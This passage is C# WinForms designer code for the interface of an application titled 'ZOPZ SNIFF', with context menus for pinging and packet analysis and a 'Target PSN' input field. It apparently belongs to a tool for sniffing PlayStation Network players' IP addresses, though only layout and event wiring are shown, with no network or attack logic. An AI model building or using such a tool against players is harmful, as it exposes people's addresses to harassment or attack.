            this.imageList1.ImageSize = new System.Drawing.Size(32, 32);
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // logInContextMenu3
            // 
            this.logInContextMenu3.BackColor = System.Drawing.Color.Black;
            this.guna2Transition1.SetDecoration(this.logInContextMenu3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.logInContextMenu3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInContextMenu3.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu3.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.logInContextMenu3.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem1,
            this.copyEntireRowToolStripMenuItem1,
            this.toolStripMenuItem4,
            this.toolStripMenuItem2,
            this.pingCellToolStripMenuItem3,
            this.packetAnalyzerToolStripMenuItem1});
            this.logInContextMenu3.Name = "logInContextMenu2";
            this.logInContextMenu3.ShowImageMargin = false;
            this.logInContextMenu3.Size = new System.Drawing.Size(186, 148);
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem1.Text = "Copy To Clipboard";
            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click_1);
            // 
            // copyEntireRowToolStripMenuItem1
            // 
            this.copyEntireRowToolStripMenuItem1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.copyEntireRowToolStripMenuItem1.Name = "copyEntireRowToolStripMenuItem1";
            this.copyEntireRowToolStripMenuItem1.Size = new System.Drawing.Size(185, 24);
            this.copyEntireRowToolStripMenuItem1.Text = "Copy Entire Row";
            this.copyEntireRowToolStripMenuItem1.Click += new System.EventHandler(this.copyEntireRowToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem4
            // 
            this.toolStripMenuItem4.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem4.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem4.Name = "toolStripMenuItem4";
            this.toolStripMenuItem4.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem4.Text = "Clear All";
            this.toolStripMenuItem4.Click += new System.EventHandler(this.toolStripMenuItem4_Click_1);
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem2.Text = "Clear Selected Row";
            this.toolStripMenuItem2.Click += new System.EventHandler(this.toolStripMenuItem2_Click_1);
            // 
            // pingCellToolStripMenuItem3
            // 
            this.pingCellToolStripMenuItem3.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.pingCellToolStripMenuItem3.Name = "pingCellToolStripMenuItem3";
            this.pingCellToolStripMenuItem3.Size = new System.Drawing.Size(185, 24);
            this.pingCellToolStripMenuItem3.Text = "Ping Cell";
            this.pingCellToolStripMenuItem3.Click += new System.EventHandler(this.pingCellToolStripMenuItem3_Click);
            // 
            // packetAnalyzerToolStripMenuItem1
            // 
            this.packetAnalyzerToolStripMenuItem1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.packetAnalyzerToolStripMenuItem1.Name = "packetAnalyzerToolStripMenuItem1";
            this.packetAnalyzerToolStripMenuItem1.Size = new System.Drawing.Size(185, 24);
            this.packetAnalyzerToolStripMenuItem1.Text = "Packet Analyzer";
            this.packetAnalyzerToolStripMenuItem1.Click += new System.EventHandler(this.packetAnalyzerToolStripMenuItem1_Click);
            // 
            // logInContextMenu6
            // 
            this.logInContextMenu6.BackColor = System.Drawing.Color.Black;
            this.guna2Transition1.SetDecoration(this.logInContextMenu6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.logInContextMenu6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInContextMenu6.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu6.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.logInContextMenu6.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem11,
            this.toolStripMenuItem12,
            this.toolStripMenuItem13});
            this.logInContextMenu6.Name = "logInContextMenu2";
            this.logInContextMenu6.ShowImageMargin = false;
            this.logInContextMenu6.Size = new System.Drawing.Size(186, 76);
            this.logInContextMenu6.Opening += new System.ComponentModel.CancelEventHandler(this.logInContextMenu6_Opening);
            // 
            // toolStripMenuItem11
            // 
            this.toolStripMenuItem11.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem11.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem11.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem11.Name = "toolStripMenuItem11";
            this.toolStripMenuItem11.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem11.Text = "Copy To Clipboard";
            this.toolStripMenuItem11.Click += new System.EventHandler(this.toolStripMenuItem11_Click_1);
            // 
            // toolStripMenuItem12
            // 
            this.toolStripMenuItem12.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem12.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem12.Name = "toolStripMenuItem12";
            this.toolStripMenuItem12.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem12.Text = "Clear Selected Row";
            this.toolStripMenuItem12.Click += new System.EventHandler(this.toolStripMenuItem12_Click);
            // 
            // toolStripMenuItem13
            // 
            this.toolStripMenuItem13.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem13.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem13.Name = "toolStripMenuItem13";
            this.toolStripMenuItem13.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem13.Text = "Clear All";
            this.toolStripMenuItem13.Click += new System.EventHandler(this.toolStripMenuItem13_Click);
            // 
            // logInContextMenu5
            // 
            this.logInContextMenu5.BackColor = System.Drawing.Color.Black;
            this.guna2Transition1.SetDecoration(this.logInContextMenu5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.logInContextMenu5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInContextMenu5.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu5.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.logInContextMenu5.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem8,
            this.copyEntireRowToolStripMenuItem,
            this.toolStripMenuItem10,
            this.toolStripMenuItem9,
            this.pingCellToolStripMenuItem2,
            this.packetAnalyzerToolStripMenuItem2});
            this.logInContextMenu5.Name = "logInContextMenu2";
            this.logInContextMenu5.ShowImageMargin = false;
            this.logInContextMenu5.Size = new System.Drawing.Size(186, 148);
            this.logInContextMenu5.Opening += new System.ComponentModel.CancelEventHandler(this.logInContextMenu5_Opening);
            // 
            // toolStripMenuItem8
            // 
            this.toolStripMenuItem8.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem8.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem8.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem8.Name = "toolStripMenuItem8";
            this.toolStripMenuItem8.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem8.Text = "Copy To Clipboard";
            this.toolStripMenuItem8.Click += new System.EventHandler(this.toolStripMenuItem8_Click);
            // 
            // copyEntireRowToolStripMenuItem
            // 
            this.copyEntireRowToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.copyEntireRowToolStripMenuItem.Name = "copyEntireRowToolStripMenuItem";
            this.copyEntireRowToolStripMenuItem.Size = new System.Drawing.Size(185, 24);
            this.copyEntireRowToolStripMenuItem.Text = "Copy Entire Row";
            this.copyEntireRowToolStripMenuItem.Click += new System.EventHandler(this.copyEntireRowToolStripMenuItem_Click);
            // 
            // toolStripMenuItem10
            // 
            this.toolStripMenuItem10.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem10.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem10.Name = "toolStripMenuItem10";
            this.toolStripMenuItem10.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem10.Text = "Clear All";
            this.toolStripMenuItem10.Click += new System.EventHandler(this.toolStripMenuItem10_Click);
            // 
            // toolStripMenuItem9
            // 
            this.toolStripMenuItem9.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem9.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem9.Name = "toolStripMenuItem9";
            this.toolStripMenuItem9.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem9.Text = "Clear Selected Row";
            this.toolStripMenuItem9.Click += new System.EventHandler(this.toolStripMenuItem9_Click);
            // 
            // pingCellToolStripMenuItem2
            // 
            this.pingCellToolStripMenuItem2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.pingCellToolStripMenuItem2.Name = "pingCellToolStripMenuItem2";
            this.pingCellToolStripMenuItem2.Size = new System.Drawing.Size(185, 24);
            this.pingCellToolStripMenuItem2.Text = "Ping Cell";
            this.pingCellToolStripMenuItem2.Click += new System.EventHandler(this.pingCellToolStripMenuItem2_Click);
            // 
            // packetAnalyzerToolStripMenuItem2
            // 
            this.packetAnalyzerToolStripMenuItem2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.packetAnalyzerToolStripMenuItem2.Name = "packetAnalyzerToolStripMenuItem2";
            this.packetAnalyzerToolStripMenuItem2.Size = new System.Drawing.Size(185, 24);
            this.packetAnalyzerToolStripMenuItem2.Text = "Packet Analyzer";
            this.packetAnalyzerToolStripMenuItem2.Click += new System.EventHandler(this.packetAnalyzerToolStripMenuItem2_Click);
            // 
            // logInContextMenu1
            // 
            this.logInContextMenu1.BackColor = System.Drawing.Color.Black;
            this.guna2Transition1.SetDecoration(this.logInContextMenu1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.logInContextMenu1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInContextMenu1.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu1.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.logInContextMenu1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem14,
            this.toolStripMenuItem16,
            this.toolStripMenuItem17,
            this.toolStripMenuItem18});
            this.logInContextMenu1.Name = "logInContextMenu2";
            this.logInContextMenu1.ShowImageMargin = false;
            this.logInContextMenu1.Size = new System.Drawing.Size(186, 100);
            this.logInContextMenu1.Opening += new System.ComponentModel.CancelEventHandler(this.logInContextMenu1_Opening);
            // 
            // toolStripMenuItem14
            // 
            this.toolStripMenuItem14.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem14.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem14.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem14.Name = "toolStripMenuItem14";
            this.toolStripMenuItem14.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem14.Text = "Copy To Clipboard";
            this.toolStripMenuItem14.Click += new System.EventHandler(this.toolStripMenuItem14_Click);
            // 
            // toolStripMenuItem16
            // 
            this.toolStripMenuItem16.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem16.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem16.Name = "toolStripMenuItem16";
            this.toolStripMenuItem16.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem16.Text = "Clear Selected Row";
            this.toolStripMenuItem16.Click += new System.EventHandler(this.toolStripMenuItem16_Click);
            // 
            // toolStripMenuItem17
            // 
            this.toolStripMenuItem17.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem17.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem17.Name = "toolStripMenuItem17";
            this.toolStripMenuItem17.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem17.Text = "Clear All";
            this.toolStripMenuItem17.Click += new System.EventHandler(this.toolStripMenuItem17_Click);
            // 
            // toolStripMenuItem18
            // 
            this.toolStripMenuItem18.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem18.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem18.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem18.Name = "toolStripMenuItem18";
            this.toolStripMenuItem18.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem18.Text = "Ping Cell";
            this.toolStripMenuItem18.Click += new System.EventHandler(this.toolStripMenuItem18_Click);
            // 
            // label6
            // 
            this.label6.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Transition1.SetDecoration(this.label6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.label6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label6.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(4, 11);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(131, 19);
            this.label6.TabIndex = 150;
            this.label6.Text = "Status: Idle";
            this.label6.Click += new System.EventHandler(this.label6_Click);
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.panel2.Controls.Add(this.label4);
            this.panel2.Controls.Add(this.guna2ControlBox1);
            this.panel2.Controls.Add(this.guna2ControlBox3);
            this.panel2.Controls.Add(this.guna2ControlBox2);
            this.Ani.SetDecoration(this.panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel2.Location = new System.Drawing.Point(0, 0);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(1097, 26);
            this.panel2.TabIndex = 163;
            this.panel2.LocationChanged += new System.EventHandler(this.panel2_LocationChanged);
            this.panel2.Paint += new System.Windows.Forms.PaintEventHandler(this.panel2_Paint);
            // 
            // label4
            // 
            this.label4.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition1.SetDecoration(this.label4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.label4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label4.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(3, 4);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(171, 22);
            this.label4.TabIndex = 153;
            this.label4.Text = "ZOPZ SNIFF";
            this.label4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.label4.Click += new System.EventHandler(this.label4_Click);
            // 
            // guna2ControlBox1
            // 
            this.guna2ControlBox1.Animated = true;
            this.guna2ControlBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2ControlBox1.BorderStyle = System.Drawing.Drawing2D.DashStyle.Dash;
            this.guna2ControlBox1.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
            this.guna2ControlBox1.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.guna2ControlBox1.Cursor = System.Windows.Forms.Cursors.Default;
            this.Ani.SetDecoration(this.guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ControlBox1.Dock = System.Windows.Forms.DockStyle.Right;
            this.guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox1.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox1.Location = new System.Drawing.Point(962, 0);
            this.guna2ControlBox1.Name = "guna2ControlBox1";
            this.guna2ControlBox1.Size = new System.Drawing.Size(45, 26);
            this.guna2ControlBox1.TabIndex = 156;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2ControlBox1, "Minimize");
            this.guna2ControlBox1.Click += new System.EventHandler(this.guna2ControlBox1_Click_4);
            // 
            // guna2ControlBox3
            // 
            this.guna2ControlBox3.Animated = true;
            this.guna2ControlBox3.BackColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox3.BorderStyle = System.Drawing.Drawing2D.DashStyle.Dash;
            this.guna2ControlBox3.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
            this.guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
            this.guna2ControlBox3.Cursor = System.Windows.Forms.Cursors.Default;
            this.Ani.SetDecoration(this.guna2ControlBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2ControlBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ControlBox3.Dock = System.Windows.Forms.DockStyle.Right;
            this.guna2ControlBox3.FillColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox3.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox3.Location = new System.Drawing.Point(1007, 0);
            this.guna2ControlBox3.Name = "guna2ControlBox3";
            this.guna2ControlBox3.Size = new System.Drawing.Size(45, 26);
            this.guna2ControlBox3.TabIndex = 158;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2ControlBox3, "Maximize");
            this.guna2ControlBox3.Click += new System.EventHandler(this.guna2ControlBox3_Click);
            // 
            // guna2ControlBox2
            // 
            this.guna2ControlBox2.Animated = true;
            this.guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox2.BorderStyle = System.Drawing.Drawing2D.DashStyle.Dash;
            this.guna2ControlBox2.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
            this.guna2ControlBox2.Cursor = System.Windows.Forms.Cursors.Default;
            this.Ani.SetDecoration(this.guna2ControlBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2ControlBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ControlBox2.Dock = System.Windows.Forms.DockStyle.Right;
            this.guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox2.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox2.Location = new System.Drawing.Point(1052, 0);
            this.guna2ControlBox2.Name = "guna2ControlBox2";
            this.guna2ControlBox2.Size = new System.Drawing.Size(45, 26);
            this.guna2ControlBox2.TabIndex = 157;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2ControlBox2, "Exit");
            this.guna2ControlBox2.Click += new System.EventHandler(this.guna2ControlBox2_Click);
            // 
            // logInThemeContainer1
            // 
            this.logInThemeContainer1.AllowClose = true;
            this.logInThemeContainer1.AllowMaximize = true;
            this.logInThemeContainer1.AllowMinimize = true;
            this.logInThemeContainer1.BackColor = System.Drawing.Color.Black;
            this.logInThemeContainer1.BaseColour = System.Drawing.Color.Black;
            this.logInThemeContainer1.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.logInThemeContainer1.CloseChoice = LoginTheme.LogInThemeContainer.@__CloseChoice.Form;
            this.logInThemeContainer1.ContainerColour = System.Drawing.Color.Black;
            this.Ani.SetDecoration(this.logInThemeContainer1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInThemeContainer1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInThemeContainer1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.logInThemeContainer1.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInThemeContainer1.FontSize = 12;
            this.logInThemeContainer1.HoverColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInThemeContainer1.Location = new System.Drawing.Point(0, 0);
            this.logInThemeContainer1.Movable = true;
            this.logInThemeContainer1.Name = "logInThemeContainer1";
            this.logInThemeContainer1.ShowIcon = true;
            this.logInThemeContainer1.Sizable = false;
            this.logInThemeContainer1.Size = new System.Drawing.Size(1097, 532);
            this.logInThemeContainer1.SmartBounds = true;
            this.logInThemeContainer1.TabIndex = 156;
            // 
            // logInThemeContainer2
            // 
            this.logInThemeContainer2.AllowClose = true;
            this.logInThemeContainer2.AllowMaximize = true;
            this.logInThemeContainer2.AllowMinimize = true;
            this.logInThemeContainer2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.logInThemeContainer2.BaseColour = System.Drawing.Color.Black;
            this.logInThemeContainer2.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
            this.logInThemeContainer2.CloseChoice = LoginTheme.LogInThemeContainer.@__CloseChoice.Form;
            this.logInThemeContainer2.ContainerColour = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(54)))), ((int)(((byte)(54)))));
            this.Ani.SetDecoration(this.logInThemeContainer2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInThemeContainer2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInThemeContainer2.Dock = System.Windows.Forms.DockStyle.Fill;
            this.logInThemeContainer2.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInThemeContainer2.FontSize = 12;
            this.logInThemeContainer2.HoverColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInThemeContainer2.Location = new System.Drawing.Point(965, 5);
            this.logInThemeContainer2.Movable = true;
            this.logInThemeContainer2.Name = "logInThemeContainer2";
            this.logInThemeContainer2.ShowIcon = true;
            this.logInThemeContainer2.Sizable = true;
            this.logInThemeContainer2.Size = new System.Drawing.Size(126, 23);
            this.logInThemeContainer2.SmartBounds = true;
            this.logInThemeContainer2.TabIndex = 156;
            // 
            // logInThemeContainer3
            // 
            this.logInThemeContainer3.AllowClose = true;
            this.logInThemeContainer3.AllowMaximize = true;
            this.logInThemeContainer3.AllowMinimize = true;
            this.logInThemeContainer3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.logInThemeContainer3.BaseColour = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.logInThemeContainer3.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
            this.logInThemeContainer3.CloseChoice = LoginTheme.LogInThemeContainer.@__CloseChoice.Form;
            this.logInThemeContainer3.ContainerColour = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(54)))), ((int)(((byte)(54)))));
            this.Ani.SetDecoration(this.logInThemeContainer3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInThemeContainer3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInThemeContainer3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.logInThemeContainer3.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInThemeContainer3.FontSize = 12;
            this.logInThemeContainer3.HoverColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInThemeContainer3.Location = new System.Drawing.Point(666, 3);
            this.logInThemeContainer3.Movable = true;
            this.logInThemeContainer3.Name = "logInThemeContainer3";
            this.logInThemeContainer3.ShowIcon = true;
            this.logInThemeContainer3.Sizable = true;
            this.logInThemeContainer3.Size = new System.Drawing.Size(75, 23);
            this.logInThemeContainer3.SmartBounds = true;
            this.logInThemeContainer3.TabIndex = 156;
            this.logInThemeContainer3.Text = "logInThemeContainer3";
            // 
            // guna2TextBox4
            // 
            this.guna2TextBox4.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.guna2TextBox4.Animated = true;
            this.guna2TextBox4.BackColor = System.Drawing.Color.Black;
            this.guna2TextBox4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2TextBox4.BorderThickness = 0;
            this.guna2TextBox4.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Ani.SetDecoration(this.guna2TextBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2TextBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2TextBox4.DefaultText = "";
            this.guna2TextBox4.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox4.DisabledState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2TextBox4.FocusedState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox4.FocusedState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox4.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2TextBox4.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox4.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox4.HoverState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox4.Location = new System.Drawing.Point(559, 4);
            this.guna2TextBox4.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.guna2TextBox4.Name = "guna2TextBox4";
            this.guna2TextBox4.PasswordChar = '\0';
            this.guna2TextBox4.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox4.PlaceholderText = "Target PSN";
            this.guna2TextBox4.SelectedText = "";
            this.guna2TextBox4.Size = new System.Drawing.Size(148, 32);
            this.guna2TextBox4.TabIndex = 152;
            this.guna2TextBox4.TextChanged += new System.EventHandler(this.guna2TextBox4_TextChanged);
            this.guna2TextBox4.KeyDown += new System.Windows.Forms.KeyEventHandler(this.guna2TextBox4_KeyDown);
            // 
            // guna2TextBox3
            // 
            this.guna2TextBox3.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.guna2TextBox3.Animated = true;
            this.guna2TextBox3.BackColor = System.Drawing.Color.Black;
            this.guna2TextBox3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2TextBox3.BorderThickness = 0;
            this.guna2TextBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Ani.SetDecoration(this.guna2TextBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2TextBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2TextBox3.DefaultText = "";
